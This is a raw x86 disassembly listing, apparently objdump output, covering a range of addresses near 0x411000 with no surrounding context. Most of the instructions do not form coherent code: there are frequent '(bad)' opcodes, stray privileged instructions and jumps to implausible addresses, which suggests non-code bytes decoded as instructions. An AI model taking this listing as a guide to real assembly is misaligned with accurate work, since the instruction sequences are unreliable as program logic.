  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
